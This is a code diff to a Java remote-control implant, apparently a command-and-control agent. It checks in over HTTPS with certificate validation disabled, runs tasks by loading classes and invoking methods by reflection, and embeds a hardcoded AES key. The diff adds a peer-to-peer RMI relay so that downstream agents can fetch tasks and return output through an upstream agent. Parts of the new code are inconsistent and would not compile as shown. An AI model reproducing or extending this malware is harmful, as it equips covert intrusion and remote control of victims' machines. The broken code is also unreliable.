@@ -35,8 +35,12 @@ import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
 import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
+import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 
@@ -70,9 +74,11 @@ import java.security.InvalidKeyException;
 class nConfig
 {
     public static int locTcpPort = 49602;
+    public static String defaultKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static int metastasize = 0;
-    public static String uri = "https://127.0.0.1";
+    public static String upstream = "127.0.0.1";
+    public static int isDownstream = 0;
     public static int isKeystone = 0;
     public static int stutterMin = 10;
     public static int stutterMax = 50;
@@ -93,11 +99,14 @@ public class Main
     static public String sessUUID = "";
     static public String nonce = "";
     static public ArrayList tasks = new ArrayList();
+    static public ArrayList downstreamTasks = new ArrayList();
+    static public Hashtable downstreamAgents = new Hashtable();
     static public ArrayList output = new ArrayList();
     static private countermeasures cm = new countermeasures();
     static private utilitarian nUtil = new utilitarian();
     static private pkgLib packager = new pkgLib();
     static private nConfig config = new nConfig();
+    static public netwHttps nComm = new netwHttps();
 
     public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
@@ -124,7 +133,6 @@ public class Main
     {
         //consolidate task and keepalive
         //5 tries to checkin
-        network nComm = new network();
         utilitarian nUtil = new utilitarian();
 
         int c;
@@ -187,6 +195,7 @@ public class Main
         for (int t=0; t<tasks.size(); t++)
         {
             Hashtable taskObj = (Hashtable) tasks.get(t);
+            tasks.remove(t);
 
             String methodName = taskObj.get("method").toString();
             String className = taskObj.get("class").toString();
@@ -199,7 +208,18 @@ public class Main
             ).split(",");
 
             //need to revive old method of finding classes and executing them because dups are bad
-            Class classObj = packager.load(className, classical);
+            ArrayList classStatus = nUtil.getClassByName(className);
+            Class classObj;
+
+            if ((boolean) classStatus.get(0))
+            {
+                classObj = (Class) classStatus.get(1);
+            }
+            else
+            {
+                classObj = packager.load(className, classical);
+            }
+
             Hashtable methObj = nUtil.getMethodByName(classObj, methodName);
             
 
@@ -238,7 +258,6 @@ public class Main
 
     public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
-        network nComm = new network();
         if (output.size() > 0)
         {
             System.out.println("output available");
@@ -315,6 +334,22 @@ public class Main
 		    int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
 		    return randNum;
 	    }
+
+        private ArrayList getClassByName(String className)
+        {
+            ArrayList outValue = new ArrayList();
+            try 
+            {
+                Class classical = Class.forName(String.format("com.nocebo.nCore.%s",className));
+                outValue.add(true);
+                outValue.add(classical);
+            } 
+            catch (ClassNotFoundException e) 
+            {
+                outValue.add(false);
+            }
+            return outValue;
+        }
 
         private Hashtable getMethodByName(Class cData, String methodName) throws ClassNotFoundException
         {
@@ -457,8 +492,163 @@ public class Main
         }
     }
 
+    public interface P2PInterface extends Remote
+    {
+        public String auth(String uuid, String passwd) throws RemoteException;
+        public String kex(String uuid, String cookie, String nonce) throws RemoteException;
+        public ArrayList get(String uuid, String cookie, String nonce) throws RemoteException;
+        public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException;
+    }
 
-    private static class network
+    public class P2PSrv extends UnicastRemoteObject implements RMIInterface
+    {
+        protected P2PSrv() throws RemoteException
+        {
+            super();
+        }
+
+        @Override
+        public String auth(String uuid, String passwd) throws RemoteException
+        {
+            String tempNonce = uuid.substring(0,12).replace("-","");
+            String authBlob = new String(
+                Base64.getDecoder().decode(
+                    secInst.decrypt(
+                        passwd.getBytes(),
+                        config.defaultKey.getBytes(),
+                        tempNonce.getBytes()
+                    )
+                )
+            );
+            if (authBlob.equals(config.passMat))
+            {
+                String cookieData = mkCookie(uuid,config.passMat);
+                downstreamAgents.put(uuid,cookieData);
+                return cookieData;
+            }
+            else
+            {
+                return "error";
+            }
+        }
+
+        @Override
+        public String kex (String uuid, String cookie, String downstreamNonce) throws RemoteException
+        {
+            String authBlob = new String(
+                Base64.getDecoder().decode(
+                    secInst.decrypt(
+                        cookie.getBytes(),
+                        config.defaultKey.getBytes(),
+                        downstreamNonce.getBytes()
+                    )
+                )
+            );
+            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
+            {
+                String kexBlob = new String(
+                    Base64.getEncoder().encode(
+                        secInst.encrypt(
+                            config.encKey.getBytes(),
+                            config.defaultKey.getBytes(), 
+                            downstreamNonce.getBytes()
+                        )
+                    )
+                );
+                return kexBlob;
+            }
+            else
+            {
+                return "error";
+            }
+        }
+
+        @Override
+        public Hashtable get(String uuid, String cookie, String downstreamNonce) throws RemoteException
+        {
+            String authBlob = new String(
+                Base64.getDecoder().decode(
+                    secInst.decrypt(
+                        cookie.getBytes(),
+                        config.encKey.getBytes(),
+                        downstreamNonce.getBytes()
+                    )
+                )
+            );
+            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
+            {
+                ArrayList taskData = new ArrayList();
+                for (int t=0;t<tasks.size();t++)
+                {
+                    Hashtable taskTable = (Hashtable) tasks.get(t);
+                    //this check needs to be duplicated in react so the agent is only running its tasks
+                    //data on backend needs to account for downstream agents so the upstream agent can receive the tasks
+                    //add downstreamtasks variable into agent config
+                    // make tasking search downstreamtasks variable
+                    if (taskTable.keySet().contains(uuid))
+                    {
+                        taskData.add(taskTable);
+                    }
+                }
+
+                return taskData;
+            }
+            else
+            {
+                return "error";
+            }
+        }
+
+        @Override
+        public Hashtable put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws RemoteException
+        {
+            String authBlob = new String(
+                Base64.getDecoder().decode(
+                    secInst.decrypt(
+                        cookie.getBytes(),
+                        config.encKey.getBytes(),
+                        downstreamNonce.getBytes()
+                    )
+                )
+            );
+            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
+            {
+                for (int d=0; d<data.size(); d++)
+                {
+                    output.add(data.get(d));
+                }
+            }
+            else
+            {
+                return "error";
+            }
+        }
+
+
+        mkCookie(String uuid, String passMat)
+        {
+            String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
+			Hashtable cookieMaterialRaw = new Hashtable();
+
+			cookieMaterialRaw.put("tstamp",timeStamp);
+			cookieMaterialRaw.put("uuid",uuid);
+			cookieMaterialRaw.put("passmat",passMat);
+			cookieMaterialRaw.put("randPadding",nUtil.strand(8));
+
+			MessageDigest digest = MessageDigest.getInstance("SHA-256");
+			byte[] encodedHash = digest.digest(
+				cookieMaterialRaw.toString().getBytes(StandardCharsets.UTF_8)
+			);
+			return new String(Base64.getEncoder().encode(encodedHash));
+        }
+    }
+
+    public class P2PClient
+    {
+
+    }
+
+    private static class netwHttps
     {
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
@@ -481,7 +671,7 @@ public class Main
             SSLContext sslCon = SSLContext.getInstance("TLS");
             sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
             
-            String fmtUri = String.format("%s/%s",config.uri,config.endpoints.get(endpointType).toString());
+            String fmtUri = String.format("https://%s/%s",config.upstream,config.endpoints.get(endpointType).toString());
             System.out.println(fmtUri);
 
             URL ctrlUrl = new URI(fmtUri).toURL();
@@ -517,6 +707,7 @@ public class Main
                     Base64.getUrlEncoder().encode(
                         secInst.encrypt(
                             postData.getBytes(), 
+                            config.encKey.getBytes(),
                             nonce.getBytes()
                         )
                     )
@@ -544,6 +735,7 @@ public class Main
                         Base64.getDecoder().decode(
                             responseData
                         ),
+                        config.encKey.getBytes(),
                         nonce.getBytes()
                     );
 
@@ -643,9 +835,9 @@ public class Main
     private static class security
     {
         //replicates my lycanthropy aesgcm
-        private byte[] encrypt(byte[] plaintext, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+        private byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
-            SecretKey key = initKey();
+            SecretKey key = initKey(keyData);
             Cipher cipher = initCipher();
 
             AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
@@ -653,9 +845,9 @@ public class Main
             return cipher.doFinal(plaintext);
         }
 
-        private byte[] decrypt(byte[] encrypted, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+        private byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
-            SecretKey key = initKey();
+            SecretKey key = initKey(keyData);
             Cipher cipher = initCipher();
 
             AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
@@ -669,9 +861,8 @@ public class Main
             return cipher;
         }
 
-        private SecretKey initKey() throws Exception
+        private SecretKey initKey(byte[] keyBytes) throws Exception
         {
-            byte[] keyBytes = config.encKey.getBytes();
             SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
             return key;
         }
